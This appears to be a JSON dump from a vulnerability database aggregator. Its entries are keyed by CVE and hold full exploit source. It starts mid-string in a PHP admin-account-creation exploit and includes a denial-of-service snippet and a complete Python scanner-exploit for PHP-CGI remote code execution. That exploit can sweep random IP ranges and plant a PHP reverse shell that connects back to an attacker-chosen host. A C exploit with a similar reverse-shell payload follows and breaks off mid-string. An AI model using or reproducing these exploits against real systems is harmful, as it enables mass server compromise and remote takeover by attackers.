Googlebot/2.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (eregi(\"The user has successfully been added\",$html))\r\n{\r\n  echo \"exploit succeeded... now login as admin\\n\";\r\n  echo \"with username \\\"suntzu\".$anumber.\"\\\" and password \\\"suntzu\".$anumber.\"\\\"\\n\";\r\n}\r\nelse\r\n{\r\n  echo \"something goes wrong...\\n\";if(!$dt)echo \"you may try -d option\\n\";\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-07-15]\r\n",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:2012"
        }
    ],
    "CVE-2012-1171": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 65673\r\nCVE(CAN) ID: CVE-2012-1171\r\n\r\nPHP\u662f\u4e00\u79cdHTML\u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\u3002\r\n\r\nPHP 5.x\u7248\u672c\u5185\u7684libxml RSHUTDOWN\u51fd\u6570\u53ef\u4f7f\u8fdc\u7a0b\u653b\u51fb\u8005\u5728\u7528\u81ea\u5b9a\u4e49\u6d41\u5c01\u88c5\u5668\u65f6\u8c03\u7528stream_close\u65b9\u6cd5\uff0c\u7ed5\u8fc7open_basedir\u4fdd\u62a4\u673a\u5236\uff0c\u8bfb\u53d6\u654f\u611f\u6587\u4ef6\u3002\r\n0\r\nPHP PHP 5.5.x\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net/downloads.php\r\nhttp://git.php.net/?p=php-src.git;a=commitdiff;h=8f4a5373bb71590352fd934028d6dde5bc18530b",
            "modified": "2014-02-21T00:00:00",
            "published": "2014-02-21T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61505",
            "id": "SSV:61505",
            "type": "seebug",
            "title": "PHP libxml RSHUTDOWN\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2012-1171)",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61505"
        }
    ],
    "CVE-2012-0788": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP PDORow Object Remote Denial Of Service Vulnerability. CVE-2012-0788. Dos exploit for php platform",
            "modified": "2011-09-24T00:00:00",
            "published": "2011-09-24T00:00:00",
            "id": "EDB-ID:36682",
            "href": "https://www.exploit-db.com/exploits/36682/",
            "type": "exploitdb",
            "title": "PHP PDORow Object Remote Denial Of Service Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/51952/info\r\n\r\nPHP is prone to a remote denial-of-service vulnerability.\r\n\r\nAn attacker can exploit this issue to cause the web server to crash, denying service to legitimate users.\r\n\r\nPHP 5.3.8 is vulnerable; other versions may also be affected. \r\n\r\n<?php\r\n\r\n// make a Pdo_Mysql statement before\r\n\r\n$result = $stmt->fetch(PDO::FETCH_LAZY);\r\n\r\nsession_start();\r\n\r\n$_SESSION['PDORow'] = $result;\r\n?> ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:36682"
        }
    ],
    "CVE-2012-2336": [
        {
            "bulletinFamily": "exploit",
            "description": "Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution (Multithreaded Scanner) (2). CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for PHP ...",
            "modified": "2013-11-01T00:00:00",
            "published": "2013-11-01T00:00:00",
            "id": "EDB-ID:40233",
            "href": "https://www.exploit-db.com/exploits/40233/",
            "type": "exploitdb",
            "title": "Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution (Multithreaded Scanner) (2)",
            "sourceData": "",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:40233"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache + PHP 5.x - Remote Code Execution (Multithreaded Scanner) (2). CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2013-10-31T00:00:00",
            "published": "2013-10-31T00:00:00",
            "id": "EDB-ID:29316",
            "href": "https://www.exploit-db.com/exploits/29316/",
            "type": "exploitdb",
            "title": "Apache + PHP 5.x - Remote Code Execution Multithreaded Scanner 2",
            "sourceData": "#!/usr/bin/env python\r\n#\r\n# ap-unlock-v2.py - apache + php 5.* rem0te c0de execution 0day (better version)\r\n#\r\n# NOTE:\r\n#   - quick'n'dirty VERY UGLYY C=000DEEE IZ N0T MY STYLE :(((\r\n#   - for connect back shell start netcat/nc and bind port on given host:port\r\n#   - is ip-range scanner not is multithreaded, but iz multithreaded iz in\r\n#   random scanner and is scanner from file (greets to MustLive)\r\n#   - no ssl support\r\n#   - more php paths can be added\r\n#   - adjust this shit for windows b0xes\r\n#\r\n# 2013\r\n# by noptrix - http://nullsecurity.net/\r\n\r\nimport sys\r\nimport socket\r\nimport argparse\r\nimport threading\r\nimport time\r\nimport random\r\nimport select\r\n\r\n\r\nNONE = 0\r\nVULN = 1\r\nSCMD = 2\r\nXPLT = 3\r\n\r\nt3st = 'POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D' \\\r\n        '%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73' \\\r\n        '%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+' \\\r\n        '%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+'\\\r\n        '%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\\r\\nHost:localhost\\r\\n'\\\r\n        'Content-Type: text/html\\r\\nContent-Length:1\\r\\n\\r\\na\\r\\n'\r\n\r\n\r\ndef m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt):\r\n    c0nn_b4ck = \\\r\n    '''\r\n    <? set_time_limit (0); $VERSION = \"1.0\"; $ip = \"''' + cb_h0st + '''\";\r\n    $port = ''' + cb_p0rt + '''; $chunk_size = 1400; $write_a = null;\r\n    $error_a = null; $shell = \"unset HISTFILE; id; /bin/sh -i\"; $daemon = 0;\r\n    $debug = 0; if (function_exists(\"pcntl_fork\")) {$pid = pcntl_fork();\r\n    if ($pid == -1) {exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {\r\n    exit(1);}$daemon = 1;} else {print \"bla\";}chdir(\"/\");umask(0);\r\n    $sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {\r\n    printit(\"$errstr ($errno)\");exit(1);}$descriptorspec = array(\r\n    0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"),2 => array(\"pipe\", \"w\"));\r\n    $process = proc_open($shell, $descriptorspec, $pipes);\r\n    if (!is_resource($process)) {exit(1);}stream_set_blocking($pipes[1], 0);\r\n    stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);\r\n    printit(\"Successfully opened reverse shell to $ip:$port\");while (1) {\r\n    if (feof($sock)) {printit(\"ERROR: Shell connection terminated\");break;}\r\n    if (feof($pipes[1])) {printit(\"ERROR: Shell process terminated\");break;}\r\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\r\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\r\n    if (in_array($sock, $read_a)) {if ($debug) printit(\"SOCK READ\");\r\n\t$input = fread($sock, $chunk_size);if ($debug) printit(\"SOCK: $input\");\r\n    fwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {\r\n    if ($debug) printit(\"STDOUT READ\");$input = fread($pipes[1], $chunk_size);\r\n\tif ($debug) printit(\"STDOUT: $input\");fwrite($sock, $input);}\r\n\tif (in_array($pipes[2], $read_a)) {if ($debug) printit(\"STDERR READ\");\r\n    $input = fread($pipes[2], $chunk_size);\r\n    if ($debug) printit(\"STDERR: $input\");fwrite($sock, $input);}}fclose($sock);\r\n    fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);\r\n    function printit ($string) {if (!$daemon) {print \"$string\\n\";}}?>\r\n    '''\r\n    return c0nn_b4ck\r\n\r\n\r\ndef enc0dez():\r\n    n33dz1 = ('cgi-bin', 'php')\r\n    n33dz2 = ('-d', 'allow_url_include=on', '-d', 'safe_mode=off', '-d',\r\n            'suhosin.simulation=on', '-d', 'disable_functions=\"\"', '-d',\r\n            'open_basedir=none', '-d', 'auto_prepend_file=php://input',\r\n            '-d', 'cgi.force_redirect=0', '-d', 'cgi.redirect_status_env=0',\r\n            '-d', 'auto_prepend_file=php://input', '-n')\r\n    fl4g = 0\r\n    arg5 = ''\r\n    p4th = ''\r\n    plus = ''\r\n \r\n    for x in n33dz2:\r\n        if fl4g == 1:\r\n            plus = '+'\r\n        arg5 = arg5 + plus + \\\r\n                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)\r\n        fl4g = 1\r\n    for x in n33dz1:\r\n        p4th = p4th + '/' + \\\r\n                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)\r\n    return (p4th.upper(), arg5.upper())\r\n\r\n\r\ndef m4k3_p4yl0rd(p4yl0rd, m0de):\r\n    p4th, arg5 = enc0dez()\r\n    if m0de == VULN:\r\n        p4yl0rd = t3st\r\n    elif m0de == SCMD or m0de == XPLT:\r\n        p4yl0rd = 'POST /' + p4th + '?' + arg5 + ' HTTP/1.1\\r\\n' \\\r\n                'Host: ' + sys.argv[1] + '\\r\\n' \\\r\n                'Content-Type: application/x-www-form-urlencoded\\r\\n' \\\r\n                'Content-Length: ' + str(len(p4yl0rd)) + '\\r\\n\\r\\n' + p4yl0rd\r\n    return p4yl0rd\r\n\r\n\r\ndef s3nd_sh1t(args, m0de, c0nn_b4ck):\r\n    pat = '<b>Parse error</b>:'\r\n    try:\r\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        s.settimeout(float(args.t))\r\n        res = s.connect_ex((args.h, int(args.p)))\r\n        if res == 0:\r\n            if m0de == VULN:\r\n                p4yl0rd = m4k3_p4yl0rd('', m0de)\r\n                s.sendall(p4yl0rd)\r\n                if pat in s.recv(4096):\r\n                    print \"--> \" + args.h + \" vu1n\"\r\n                    return args.h\r\n                else:\r\n                    if args.v:\r\n                        print \"--> %s n0t vu1n\" % (args.h)\r\n                    return\r\n            elif m0de == SCMD:\r\n                p4yl0rd = m4k3_p4yl0rd('<? system(\"' + args.c + '\"); ?>', m0de)\r\n                s.sendall(p4yl0rd)\r\n                rd, wd, ex = select.select([s], [], [], float(args.t))\r\n                if rd:\r\n                    for line in s.makefile():\r\n                        print line,\r\n            elif m0de == XPLT:\r\n                p4yl0rd = m4k3_p4yl0rd(c0nn_b4ck, m0de)\r\n                s.sendall(p4yl0rd)\r\n        else:\r\n            if args.v:\r\n                print \"--> n0 w3bs3rv3r 0n %s\" % (args.h)\r\n    except socket.error:\r\n        return\r\n    return\r\n\r\n\r\ndef m4k3_r4nd_1p4ddr(num):\r\n    h0sts = []\r\n    for x in range(int(num)):\r\n        h0sts.append('%d.%d.%d.%d' % (random.randrange(0,255),\r\n                random.randrange(0,255), random.randrange(0,255),\r\n                random.randrange(0,255)))\r\n    return h0sts\r\n\r\n\r\ndef sc4n_r4nd0m(args, h0st, m0de, vu1nz):\r\n    args.h = h0st\r\n    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n    vu1nz = filter(None, vu1nz)\r\n    return\r\n\r\n\r\ndef sc4n_fr0m_f1le(args, h0st, m0de, vu1nz):\r\n    args.h = h0st.rstrip()\r\n    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n    vu1nz = filter(None, vu1nz)\r\n    return\r\n\r\n\r\ndef sc4n_r4ng3(rsa, rsb, args, m0de):\r\n    vu1nz = []\r\n    for i in range (rsa[0], rsb[0]):\r\n        for j in range (rsa[1], rsb[1]):\r\n            for k in range (rsa[2], rsb[2]):\r\n                for l in range(rsa[3], rsb[3]):\r\n                    args.h = str(i) + \".\" + str(j) + \".\" + str(k) + \".\" + str(l)\r\n                    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n                    time.sleep(0.005)\r\n    vu1nz = filter(None, vu1nz)\r\n    return vu1nz\r\n\r\n\r\ndef m4k3_ipv4_r4ng3(iprange):\r\n    a = tuple(part for part in iprange.split('.'))\r\n    rsa = (range(4))\r\n    rsb = (range(4))\r\n    for i in range(0,4):\r\n        ga = a[i].find('-')\r\n        if ga != -1:\r\n            rsa[i] = int(a[i][:ga])\r\n            rsb[i] = int(a[i][1+ga:]) + 1                                        \r\n        else:\r\n            rsa[i] = int(a[i])\r\n            rsb[i] = int(a[i]) + 1\r\n    return (rsa, rsb)\r\n\r\n\r\ndef parse_args():\r\n    p = argparse.ArgumentParser(\r\n    usage='\\n\\n  ./ap-unlock-v2.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]'\\\r\n            '\\n  ./ap-unlock-v2.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]',\r\n    formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)\r\n    opts = p.add_argument_group('0pt1ons', '')\r\n    opts.add_argument('-h', metavar='wh1t3h4tz.0rg',\r\n            help='| t3st s1ngle h0st f0r vu1n')\r\n    opts.add_argument('-p', default=80, metavar='80',\r\n            help='| t4rg3t p0rt (d3fau1t: 80)')\r\n    opts.add_argument('-c', metavar='\\'uname -a;id\\'',\r\n            help='| s3nd c0mm4nds t0 h0st')\r\n    opts.add_argument('-x', metavar='192.168.0.2:1337',\r\n            help='| c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll')\r\n    opts.add_argument('-s', action='store_true',\r\n            help='| t3st s1ngl3 h0st f0r vu1n')\r\n    opts.add_argument('-r', metavar='133.1.3-7.7-37',\r\n            help='| sc4nz iP addr3ss r4ng3 f0r vu1n')\r\n    opts.add_argument('-R', metavar='1337',\r\n            help='| sc4nz num r4nd0m h0st5 f0r vu1n')\r\n    opts.add_argument('-t', default=3, metavar='3',\r\n            help='| t1me0ut in s3x (d3fau1t: 3)')\r\n    opts.add_argument('-f', metavar='vu1n.lst',\r\n            help='| wr1t3 vu1n h0sts t0 f1l3')\r\n    opts.add_argument('-i', metavar='sc4nz.lst',\r\n            help='| sc4nz h0sts fr0m f1le f0r vu1n')\r\n    opts.add_argument('-S', metavar='2',\r\n            help='| sl33pz in s3x b3tw33n thr3adz (d3fault: 2)')\r\n    opts.add_argument('-T', default=2, metavar='4',\r\n            help='| nuM sc4n thr3adz (d3fault: 4)')\r\n    opts.add_argument('-v', action='store_true',\r\n            help='| pr1nt m0ah 1nf0z wh1l3 sh1tt1ng')\r\n    args = p.parse_args()\r\n    if not args.h and not args.r and not args.R and not args.i:\r\n        p.print_help()\r\n        sys.exit(0)\r\n    return args\r\n\r\n\r\ndef wr1te_fil3(args, vu1nz):\r\n    if args.f:\r\n        if vu1nz:\r\n            try:\r\n                f = open(args.f, \"w\")\r\n                f.write(\"\\n\".join(vu1nz)+\"\\n\")\r\n                f.close()\r\n            except:\r\n                sys.stderr.write('de1n3 mudd1 k0cht guT')\r\n                sys.stderr.write('\\n')\r\n                raise SystemExit()\r\n    return\r\n\r\n\r\ndef c0ntr0ller():\r\n    vu1nz = []\r\n    m0de = NONE\r\n    try:\r\n        args = parse_args()\r\n        if not args.t:\r\n            args.t = float(3)\r\n        if args.h:\r\n            if args.s:\r\n                print \"[+] sc4nn1ng s1ngl3 h0st %s \" % (args.h)\r\n                m0de = VULN\r\n                s3nd_sh1t(args, m0de, None)\r\n            elif args.c:\r\n                print \"[+] s3nd1ng c0mm4ndz t0 h0st %s \" % (args.h)\r\n                m0de = SCMD\r\n                s3nd_sh1t(args, m0de, None)\r\n            elif args.x:\r\n                print \"[+] xpl0it1ng b0x %s \" % (args.h)\r\n                m0de = XPLT\r\n                if args.x.find(':') != -1:\r\n                    if not args.x.split(':')[1]:\r\n                        print \"[-] 3rr0r: p0rt m1ss1ng\"\r\n                    else:\r\n                        cb_h0st = args.x.split(':')[0]\r\n                        cb_p0rt = args.x.split(':')[1]\r\n                else:\r\n                    print \"[-] 3rr0r: <h0st>:<p0rt> y0u l4m3r\"\r\n                c0nn_b4ck = m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt)\r\n                s3nd_sh1t(args, m0de, c0nn_b4ck)\r\n            else:\r\n                print \"[-] 3rr0r: m1ss1ng -s, -c 0r -x b1tch\"\r\n                sys.exit(-1)\r\n        if args.r:\r\n            print \"[+] sc4nn1ng r4ng3 %s \" % (args.r)\r\n            m0de = VULN\r\n            rsa, rsb = m4k3_ipv4_r4ng3(args.r)\r\n            vu1nz = sc4n_r4ng3(rsa, rsb, args, m0de)\r\n        if args.R:\r\n            print \"[+] sc4nn1ng %d r4nd0m b0xes\" % (int(args.R))\r\n            m0de = VULN\r\n            if not args.S:\r\n                args.S = float(2)\r\n            h0sts = m4k3_r4nd_1p4ddr(int(args.R))\r\n            for h0st in h0sts:\r\n                try:\r\n                    t = threading.Thread(target=sc4n_r4nd0m, args=(args, h0st,\r\n                        m0de, vu1nz))\r\n                    t.start()\r\n                    time.sleep(float(args.S))\r\n                    while threading.activeCount() > int(args.T):\r\n                        time.sleep(2)\r\n                except:\r\n                    sys.stdout.flush()\r\n                    sys.stdout.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n                    raise SystemExit\r\n        if args.i:\r\n            print \"[+] sc4nn1ng b0xes fr0m f1le %s\" % (args.i)\r\n            m0de = VULN\r\n            h0sts = tuple(open(args.i, 'r'))\r\n            if not args.S:\r\n                args.S = float(2)\r\n            for h0st in h0sts:\r\n                try:\r\n                    t = threading.Thread(target=sc4n_fr0m_f1le, args=(args,\r\n                        h0st, m0de, vu1nz))\r\n                    t.start()\r\n                    time.sleep(float(args.S))\r\n                    while threading.activeCount() > int(args.T):\r\n                        time.sleep(2)\r\n                except KeyboardInterrupt:\r\n                    sys.stdout.flush()\r\n                    sys.stdout.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n                    raise SystemExit\r\n            #sc4n_fr0m_f1le(args, h0sts, m0de, vu1nz)\r\n    except KeyboardInterrupt:\r\n        sys.stdout.flush()\r\n        sys.stderr.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n        raise SystemExit\r\n    wr1te_fil3(args, vu1nz)\r\n\r\n    return\r\n\r\n\r\ndef m41n():\r\n    if  __name__ == \"__main__\":\r\n        print \"--==[ ap-unlock-v2.py by noptrix@nullsecurity.net ]==--\"\r\n        c0ntr0ller()\r\n    else:\r\n        print \"[-] 3rr0r: y0u fuck3d up dud3\"\r\n        sys.exit(1)\r\n    print \"[+] h0p3 1t h3lp3d\"\r\n\r\n\r\n# \\o/ fr33 requiem 1337 h4x0rs ... \r\nm41n()\r\n\r\n# e0F",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:29316"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache / PHP 5.x - cgi-bin Remote Code Execution Exploit. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for linux platform",
            "modified": "2013-10-29T00:00:00",
            "published": "2013-10-29T00:00:00",
            "id": "EDB-ID:29290",
            "href": "https://www.exploit-db.com/exploits/29290/",
            "type": "exploitdb",
            "title": "Apache / PHP 5.x - cgi-bin Remote Code Execution Exploit",
            "sourceData": "/* Apache Magica by Kingcope */\r\n/* gcc apache-magika.c -o apache-magika -lssl */\r\n/* This is a code execution bug in the combination of Apache and PHP.\r\nOn Debian and Ubuntu the vulnerability is present in the default install\r\nof the php5-cgi package. When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with Suhosin-Patch\r\nAffected versions\r\nPHP prior to 5.3.12\r\nPHP prior to 5.4.2\r\nUnaffected versions\r\nPHP 4 - getopt parser unexploitable\r\nPHP 5.3.12 and up\r\nPHP 5.4.2 and up\r\nUnaffected versions are patched by CVE-2012-1823.\r\n*/\r\n/*    .\r\n     /'\\rrq rk\r\n .  // \\\\  .\r\n.x.//fco\\\\-|-\r\n '//cmtco\\\\zt\r\n //6meqrg.\\\\tq\r\n//_________\\\\'\r\nEJPGQO\r\napache-magica.c by Kingcope\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <getopt.h>\r\n#include <sys/types.h>\r\n#include <stddef.h>\r\n#include <openssl/rand.h>\r\n#include <openssl/ssl.h>\r\n#include <openssl/err.h>\r\n#include <netdb.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n\r\ntypedef struct {\r\n\tint sockfd;\r\n\tSSL *handle;\r\n\tSSL_CTX *ctx;\r\n} connection;\r\n\r\nvoid usage(char *argv[])\r\n{\r\n  printf(\"usage: %s <--target target> <--port port> <--protocol http|https> \" \\\r\n  \"<--reverse-ip ip> <--reverse-port port> [--force-interpreter interpreter]\\n\",\r\n   argv[0]);\r\n  exit(1);\r\n}\r\n\r\nchar poststr[] = \"POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F\" \\\r\n \"%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64\" \\\r\n \"+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73\" \\\r\n \"%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E\" \\\r\n \"%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63\" \\\r\n \"%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62\" \\\r\n \"%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74\" \\\r\n \"%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68\" \\\r\n \"%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F\" \\\r\n \"%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63\" \\\r\n \"%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73\" \\\r\n \"%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\\r\\n\" \\\r\n \"Host: %s\\r\\n\" \\\r\n \"User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26\" \\\r\n \"(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\" \\\r\n \"Content-Type: application/x-www-form-urlencoded\\r\\n\" \\\r\n \"Content-Length: %d\\r\\n\" \\\r\n \"Connection: close\\r\\n\\r\\n%s\";\r\nchar phpstr[] = \"<?php\\n\" \\\r\n\"set_time_limit(0);\\n\" \\\r\n\"$ip = '%s';\\n\" \\\r\n\"$port = %d;\\n\" \\\r\n\"$chunk_size = 1400;\\n\" \\\r\n\"$write_a = null;\\n\" \\\r\n\"$error_a = null;\\n\" \\\r\n\"$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\\n\" \\\r\n\"$daemon = 0;\\n\" \\\r\n\"$debug = 0;\\n\" \\\r\n\"if (function_exists('pcntl_fork')) {\\n\" \\\r\n\"\t$pid = pcntl_fork();\t\\n\" \\\r\n\"\tif ($pid == -1) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Can't fork\\\");\\n\" \\\r\n\"\t\texit(1);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif ($pid) {\\n\" \\\r\n\"\t\texit(0);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (posix_setsid() == -1) {\\n\" \\\r\n\"\t\tprintit(\\\"Error: Can't setsid()\\\");\\n\" \\\r\n\"\t\texit(1);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\t$daemon = 1;\\n\" \\\r\n\"} else {\\n\" \\\r\n\"\tprintit(\\\"WARNING: Failed to daemonise.\\\");\\n\" \\\r\n\"}\\n\" \\\r\n\"chdir(\\\"/\\\");\\n\" \\\r\n\"umask(0);\\n\" \\\r\n\"$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\n\" \\\r\n\"if (!$sock) {\\n\" \\\r\n\"\tprintit(\\\"$errstr ($errno)\\\");\\n\" \\\r\n\"\texit(1);\\n\" \\\r\n\"}\\n\" \\\r\n\"$descriptorspec = array(\\n\" \\\r\n\"   0 => array(\\\"pipe\\\", \\\"r\\\"),\\n\" \\\r\n\"   1 => array(\\\"pipe\\\", \\\"w\\\"),\\n\" \\\r\n\"   2 => array(\\\"pipe\\\", \\\"w\\\")\\n\" \\\r\n\");\\n\" \\\r\n\"$process = proc_open($shell, $descriptorspec, $pipes);\\n\" \\\r\n\"if (!is_resource($process)) {\\n\" \\\r\n\"\tprintit(\\\"ERROR: Can't spawn shell\\\");\\n\" \\\r\n\"\texit(1);\\n\" \\\r\n\"}\\n\" \\\r\n\"stream_set_blocking($pipes[0], 0);\\n\" \\\r\n\"stream_set_blocking($pipes[1], 0);\\n\" \\\r\n\"stream_set_blocking($pipes[2], 0);\\n\" \\\r\n\"stream_set_blocking($sock, 0);\\n\" \\\r\n\"while (1) {\\n\" \\\r\n\"\tif (feof($sock)) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Shell connection terminated\\\");\\n\" \\\r\n\"\t\tbreak;\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (feof($pipes[1])) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Shell process terminated\\\");\\n\" \\\r\n\"\t\tbreak;\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\" \\\r\n\"\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\" \\\r\n\"\tif (in_array($sock, $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"SOCK READ\\\");\\n\" \\\r\n\"\t\t$input = fread($sock, $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"SOCK: $input\\\");\\n\" \\\r\n\"\t\tfwrite($pipes[0], $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (in_array($pipes[1], $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDOUT READ\\\");\\n\" \\\r\n\"\t\t$input = fread($pipes[1], $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDOUT: $input\\\");\\n\" \\\r\n\"\t\tfwrite($sock, $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (in_array($pipes[2], $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDERR READ\\\");\\n\" \\\r\n\"\t\t$input = fread($pipes[2], $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDERR: $input\\\");\\n\" \\\r\n\"\t\tfwrite($sock, $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"}\\n\" 